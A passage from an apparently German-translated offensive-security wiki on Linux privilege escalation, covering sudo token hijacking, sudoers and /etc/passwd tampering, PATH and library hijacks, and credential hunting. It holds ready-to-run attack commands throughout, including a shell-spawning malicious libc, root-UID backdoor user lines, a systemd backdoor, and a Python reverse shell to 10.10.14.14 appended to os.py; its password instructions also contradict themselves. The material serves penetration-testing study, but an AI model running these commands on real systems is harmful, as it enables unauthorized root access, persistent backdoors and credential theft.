Wenn du auf `sudo -l` zugreifen kannst, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Reusing Sudo Tokens

In Fällen, in denen du **sudo access** hast, aber nicht das Passwort, kannst du Privilegien eskalieren, indem du **auf die Ausführung eines sudo-Kommandos wartest und dann das Session-Token kaperst**.

Voraussetzungen, um Privilegien zu eskalieren:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um in den **letzten 15 Minuten** etwas auszuführen (standardmäßig ist das die Dauer des sudo-Tokens, die es uns erlaubt, `sudo` ohne Eingabe eines Passworts zu verwenden)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- gdb ist verfügbar (du kannst es hochladen)

(Du kannst `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) wird die Binärdatei `activate_sudo_token` in _/tmp_ erstellen. Du kannst sie verwenden, um das **sudo token in deiner Session zu aktivieren** (du bekommst nicht automatisch eine root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite Exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, die **root gehört und setuid hat**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird eine **sudoers file** erstellen, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie **Schreibrechte** in dem Verzeichnis oder an einer der darin angelegten Dateien haben, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **einen sudo-Token für einen Benutzer und PID zu erstellen**.\
Zum Beispiel: Wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine Shell als dieser Benutzer mit PID 1234 haben, können Sie **sudo-Privilegien** erhalten, ohne das Passwort zu kennen, indem Sie:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien in `/etc/sudoers.d` legen fest, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du eine beliebige Datei **schreiben** kannst, wirst du in der Lage sein, **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine weitere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo`-Binary wie `doas` für OpenBSD. Denken Sie daran, dessen Konfiguration in `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **user sich normalerweise an einer Maschine anmeldet und `sudo` verwendet** um Privilegien zu eskalieren und du eine shell in diesem user-Kontext hast, kannst du **ein neues sudo executable erstellen**, das zuerst deinen Code als root und danach den Befehl des users ausführt. Danach **den $PATH** des user-Kontexts ändern (z. B. den neuen Pfad in .bash_profile hinzufügen), sodass beim Ausführen von sudo dein sudo executable gestartet wird.

Beachte, dass wenn der user eine andere shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifiziert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder etwas wie:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Geteilte Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Eintrag: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** gesucht wird. Beispielsweise enthält `/etc/ld.so.conf.d/libc.conf` den Pfad `/usr/local/lib`. **Das bedeutet, dass das System innerhalb von `/usr/local/lib` nach Bibliotheken suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, auf eine Datei innerhalb von `/etc/ld.so.conf.d/` oder auf einen Ordner, auf den in einer Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er die Privilegien eskalieren.\
Sieh dir auf der folgenden Seite an, **wie diese Fehlkonfiguration ausgenutzt werden kann**:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch Kopieren der lib in `/var/tmp/flag15/` wird sie vom Programm an dieser Stelle verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities provide a **subset of the available root privileges to a process**. This effectively breaks up root **privileges into smaller and distinctive units**. Each of these units can then be independently granted to processes. This way the full set of privileges is reduced, decreasing the risks of exploitation.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) represent the secondary layer of discretionary permissions, capable of **overriding the traditional ugo/rwx permissions**. These permissions enhance control over file or directory access by allowing or denying rights to specific users who are not the owners or part of the group. This level of **granularity ensures more precise access management**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Abrufen** von Dateien mit bestimmten ACLs aus dem System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Versteckte ACL backdoor in sudoers drop-ins

Eine häufige Fehlkonfiguration ist eine root-eigene Datei in `/etc/sudoers.d/` mit Modus `440`, die einem Benutzer mit geringen Rechten weiterhin über ACL Schreibzugriff gewährt.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Wenn Sie etwas wie `user:alice:rw-` sehen, kann der Benutzer trotz restriktiver Berechtigungsbits eine sudo-Regel anhängen:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Dies ist ein hochwirksamer ACL persistence/privesc-Pfad, da er in reinen `ls -l`-Überprüfungen leicht übersehen wird.

## Offene shell sessions

In **älteren Versionen** kannst du möglicherweise eine **shell**-Session eines anderen Nutzers (**root**) **hijack**.\
In **neueren Versionen** kannst du dich nur mit screen sessions deines **eigenen Users** **connect**. Du könntest jedoch **interessante Informationen innerhalb der session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**An eine Sitzung anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem mit **old tmux versions**. Ich konnte eine tmux (v2.1) session, die von root erstellt wurde, als nicht-privilegierter Benutzer nicht hijacken.

**tmux sessions auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.  
Dieser Bug tritt beim Erzeugen eines neuen ssh-Schlüssels auf diesen OS auf, da **nur 32.768 Variationen möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den ssh public key hat, kann man nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob Password-Authentifizierung erlaubt ist. Der Standard ist `no`.
- **PubkeyAuthentication:** Gibt an, ob public key authentication erlaubt ist. Der Standard ist `yes`.
- **PermitEmptyPasswords**: Wenn Password-Authentifizierung erlaubt ist, gibt dies an, ob der Server Logins zu Konten mit leerem Passwort zulässt. Der Standard ist `no`.

### Login control files

Diese Dateien beeinflussen, wer sich anmelden kann und wie:

- **`/etc/nologin`**: falls vorhanden, blockiert es Nicht-root-Logins und gibt seine Nachricht aus.
- **`/etc/securetty`**: schränkt ein, von wo root sich anmelden kann (TTY allowlist).
- **`/etc/motd`**: Post-Login-Banner (kann environment- oder Wartungsdetails leak).

### PermitRootLogin

Legt fest, ob sich root per ssh anmelden kann, Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key einloggen
- `without-password` or `prohibit-password`: root kann sich nur mit einem private key anmelden
- `forced-commands-only`: root kann sich nur mit private key anmelden und nur wenn die commands-Optionen angegeben sind
- `no` : nein

### AuthorizedKeysFile

Legt Dateien fest, die die public keys enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" anzumelden, ssh den public key deines Keys mit den Einträgen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding erlaubt es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem Server zu lassen. Dadurch kannst du via ssh **jump** **to a host** und von dort **jump to another** host **using** den **key** auf deinem **initial host** verwenden.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host auf die Schlüssel zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder ablehnen.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du irgendeine von ihnen **schreiben oder ändern kannst, kannst du escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein seltsames Profilskript gefunden wird, solltest du es auf **sensible Angaben** überprüfen.

### Passwd/Shadow-Dateien

Je nach OS können die `/etc/passwd` und `/etc/shadow` Dateien einen anderen Namen haben oder es kann eine Sicherung existieren. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob Hashes in den Dateien enthalten sind**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten Datei).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbar /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Füge dann den Benutzer `hacker` hinzu und setze das generierte Passwort: `n7$KpR9!q2DfZ#4m`.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den `su`-Befehl mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Du könntest die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Sie sollten prüfen, ob Sie in einige **sensible Dateien** schreiben können. Zum Beispiel: Können Sie in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und Sie **die Tomcat-Service-Konfigurationsdatei in /etc/systemd/ ändern,** dann können Sie die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Deine backdoor wird beim nächsten Start von tomcat ausgeführt.

### Ordner prüfen

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich kannst du den letzten nicht lesen, aber versuche es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsamer Ort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB-Dateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lies den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er durchsucht **mehrere mögliche Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das du dafür verwenden kannst, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) welches eine Open-Source-Anwendung ist, mit der viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac wiederhergestellt werden können.

### Logs

If you can read logs, you may be able to find **interesting/confidential information inside them**. Je seltsamer das Log ist, desto interessanter wird es wahrscheinlich sein.\
Also, some "**bad**" configured (backdoored?) **audit logs** may allow you to **record passwords** inside audit logs as explained in this post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest auch nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und außerdem nach IPs und E-Mails in Logs sowie nach hashes/regexps suchen.\\
Ich werde hier nicht aufzählen, wie man das alles macht, aber wenn du interessiert bist, kannst du die letzten Checks, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform, prüfen.

## Schreibbare Dateien

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` erlaubt Benutzern mit **Schreibberechtigungen** für eine Logdatei oder deren übergeordnete Verzeichnisse potenziell, Privilegien zu eskalieren. Das liegt daran, dass `logrotate`, das häufig als **root** läuft, so manipuliert werden kann, dass beliebige Dateien ausgeführt werden, insbesondere in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, in dem Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Ausführlichere Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Diese Schwachstelle kann mit [**logrotten**](https://github.com/whotwagner/logrotten) ausgenutzt werden.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**, daher sollten Sie, sobald Sie Logdateien verändern können, prüfen, wer diese Logs verwaltet und ob Sie die Privilegien eskalieren können, indem Sie die Logs durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referenz zur Schwachstelle:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer in der Lage ist, ein `ifcf-<whatever>` Skript nach _/etc/sysconfig/network-scripts_ **zu schreiben** **oder** ein vorhandenes **anzupassen**, dann ist Ihr **System pwned**.

Network-Skripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau aus wie .INI-Dateien. Allerdings werden sie unter Linux vom Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird der `NAME=`-Wert in diesen Netzwerkskripten nicht korrekt verarbeitet. Wenn Sie **Leer-/Blankzeichen im Namen haben, versucht das System den Teil nach dem Leer-/Blankzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: Beachte das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es umfasst Skripte zum `start`, `stop`, `restart` und manchmal `reload` von Services. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Wiederum ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Aufgaben verwendet. Trotz des Wechsels zu Upstart werden SysVinit-Skripte wegen einer Kompatibilitätsschicht in Upstart weiterhin zusammen mit Upstart-Konfigurationen genutzt.

**systemd** hat sich als moderner Init- und Service-Manager durchgesetzt und bietet erweiterte Funktionen wie on-demand Daemon-Start, automount-Management und Systemzustands-Snapshots. Es organisiert Dateien in `/usr/lib/systemd/` für Distribution-Pakete und `/etc/systemd/system/` für Administrator-Modifikationen und vereinfacht so die Systemverwaltung.

## Weitere Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität einem userspace manager zugänglich zu machen. Schwache manager-Authentifizierung (z. B. signature checks basierend auf FD-order oder schlechte Passwortschemata) kann einer local app ermöglichen, den manager zu impersonate und auf already-rooted Geräten zu escalate to root. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-gesteuerte Service-Discovery in VMware Tools/Aria Operations kann einen Binary-Pfad aus Prozess-Commandlines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zulässige Muster (z. B. Verwendung von \S) können angreifer-plazierte Listener in beschreibbaren Orten (z. B. /tmp/httpd) matchen, was zur Ausführung als root führt (CWE-426 Untrusted Search Path).

Weitere Informationen und ein generalisiertes Muster, das auf andere Discovery/Monitoring-Stacks anwendbar ist, hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mehr Hilfe

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
